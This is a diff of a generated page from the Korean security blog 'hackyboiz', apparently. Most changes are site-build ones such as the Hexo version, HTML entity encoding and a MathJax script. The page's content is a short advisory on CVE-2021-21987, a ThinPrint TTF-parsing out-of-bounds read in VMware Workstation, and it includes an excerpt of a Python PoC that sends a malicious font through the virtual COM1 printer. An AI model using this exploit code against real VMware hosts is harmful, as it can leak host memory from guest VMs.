@@ -61,7 +61,7 @@
   <script src="/js/utils.js"></script>
   <script src="/js/color-schema.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
 </head>
 
 <body>
@@ -189,7 +189,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      289 자
+      439 자
     </span>
   
 
@@ -199,7 +199,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      8
        분
     </span>
   
@@ -242,13 +242,13 @@
               </script>
               <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/houjingyi233/my-bugs/tree/main/CVE-2021-21987-vmware-out-of-bounds%20read%20vulnerability%20via%20Cortado%20ThinPrint">CVE-2021-21987-vmware-out-of-bounds read vulnerability via Cortado ThinPrint</a></p>
 <h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
-<li>VMware Workstation 16.1.2 이전</li>
-<li>Horizon Client 5.5.2 이전</li>
+<li>VMware Workstation 16.1.2 &#xC774;&#xC804;</li>
+<li>Horizon Client 5.5.2 &#xC774;&#xC804;</li>
 </ul>
-<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMWare Workstation 및 Windows용 Horizon Client에 설치된 Windows 10의 가상 프린터 구성요소에서 발견된 범위를 벗어난 읽기(Out-of-Bound Read) 취약점의 PoC가 공개되었습니다.</p>
-<p>VMWare의 가상 프린터인 ThinPrint 구성 요소는 게스트 Windows에서 문서 및 이미지를 파싱해 호스트 OS에 연결된 프린터로 출력할 수 있는 기능을 지원합니다. 취약점은 <code>rundll32.exe</code>에서 로드되는 <code>TPView.dll</code>이 폰트 확장자 <code>TrueType Font(TTF)</code>를 파싱하는 코드에 존재하며 TTF 파일의 검증이 충분히 이루어지지 않아 해커의 악성 TTF 파일을 파싱하는 과정에서 메모리를 읽어 정보 유출로 이어질 수 있습니다. 아래는 COM1 포트의 가상 프린터를 활성화하고 악성 TTF 파일을 전달하는 PoC의 일부입니다.</p>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMWare Workstation &#xBC0F; Windows&#xC6A9; Horizon Client&#xC5D0; &#xC124;&#xCE58;&#xB41C; Windows 10&#xC758; &#xAC00;&#xC0C1; &#xD504;&#xB9B0;&#xD130; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xC77D;&#xAE30;(Out-of-Bound Read) &#xCDE8;&#xC57D;&#xC810;&#xC758; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>VMWare&#xC758; &#xAC00;&#xC0C1; &#xD504;&#xB9B0;&#xD130;&#xC778; ThinPrint &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB294; &#xAC8C;&#xC2A4;&#xD2B8; Windows&#xC5D0;&#xC11C; &#xBB38;&#xC11C; &#xBC0F; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD30C;&#xC2F1;&#xD574; &#xD638;&#xC2A4;&#xD2B8; OS&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xD504;&#xB9B0;&#xD130;&#xB85C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>rundll32.exe</code>&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; <code>TPView.dll</code>&#xC774; &#xD3F0;&#xD2B8; &#xD655;&#xC7A5;&#xC790; <code>TrueType Font(TTF)</code>&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70; TTF &#xD30C;&#xC77C;&#xC758; &#xAC80;&#xC99D;&#xC774; &#xCDA9;&#xBD84;&#xD788; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xC758; &#xC545;&#xC131; TTF &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xC5B4; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; COM1 &#xD3EC;&#xD2B8;&#xC758; &#xAC00;&#xC0C1; &#xD504;&#xB9B0;&#xD130;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xC545;&#xC131; TTF &#xD30C;&#xC77C;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xB294; PoC&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</p>
 <pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPVM</span>:</span>
-SERIAL_PORT=<span class="hljs-string">b&#x27;\\\\\\\\.\\\\COM1&#x27;</span>
+SERIAL_PORT=<span class="hljs-string">b&apos;\\\\\\\\.\\\\COM1&apos;</span>
     <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>
         self.hPort=windll.kernel32.CreateFileA(self.SERIAL_PORT,
                                                <span class="hljs-number">0xc0000000</span>, <span class="hljs-comment"># GENERIC_READ | GENERIC_WRITE</span>
@@ -258,7 +258,7 @@ SERIAL_PORT=<span class="hljs-string">b&#x27;\\\\\\\\.\\\\COM1&#x27;</span>
                                                <span class="hljs-number">0</span>,
                                                <span class="hljs-literal">None</span>)
         <span class="hljs-keyword">if</span> (self.hPort &amp; <span class="hljs-number">0xffffffff</span>) == <span class="hljs-number">0xffffffff</span>:
-            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;the serial port could not be opened (0x%08x)&#x27;</span>%(GetLastError()))
+            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;the serial port could not be opened (0x%08x)&apos;</span>%(GetLastError()))
 
         <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> windll.kernel32.SetupComm(self.hPort, <span class="hljs-number">0x20000</span>, <span class="hljs-number">0x84d0</span>):
             <span class="hljs-keyword">raise</span> WinError()
@@ -269,21 +269,21 @@ f = open(<span class="hljs-string">&quot;poc.ttf&quot;</span>, <span class="hljs
 font_data = f.read()
 f.close()
 
-emri_engine_font = struct.pack(<span class="hljs-string">&#x27;&lt;IIIII&#x27;</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">8</span> + FONT_COUNT * <span class="hljs-number">4</span> + len(font_data) + <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, FONT_COUNT, len(font_data))
-emri_engine_font += binascii.a2b_hex(<span class="hljs-string">&#x27;00000000&#x27;</span>)
+emri_engine_font = struct.pack(<span class="hljs-string">&apos;&lt;IIIII&apos;</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">8</span> + FONT_COUNT * <span class="hljs-number">4</span> + len(font_data) + <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, FONT_COUNT, len(font_data))
+emri_engine_font += binascii.a2b_hex(<span class="hljs-string">&apos;00000000&apos;</span>)
 emri_engine_font += font_data
 
 <span class="hljs-comment"># Put it all together.</span>
 data_plaintext = devmode + emfspool_hdr + emf + emri_metafile_ext + emri_engine_font
 data_compressed = zlib.compress(data_plaintext, <span class="hljs-number">9</span>)
-print_command = struct.pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, <span class="hljs-number">0</span>) + struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, len(data_compressed), len(data_plaintext)) + data_compressed
+print_command = struct.pack(<span class="hljs-string">&apos;&lt;H&apos;</span>, <span class="hljs-number">0</span>) + struct.pack(<span class="hljs-string">&apos;&lt;II&apos;</span>, len(data_compressed), len(data_plaintext)) + data_compressed
 
 <span class="hljs-comment"># Send the printing command.</span>
 t.do_data(print_command)
 t.do_command(<span class="hljs-number">0x8002</span>)
 t.close()</code></pre>
 
-<p>해당 취약점은 지난 2016년 Google Project Zero가 발견한 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=849">CVE-2016-7083</a> 과 유사한 것으로 알려졌습니다.</p>
+<p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC9C0;&#xB09C; 2016&#xB144; Google Project Zero&#xAC00; &#xBC1C;&#xACAC;&#xD55C; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=849">CVE-2016-7083</a> &#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 
             </div>
             <hr>
@@ -586,6 +586,45 @@ t.close()</code></pre>
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
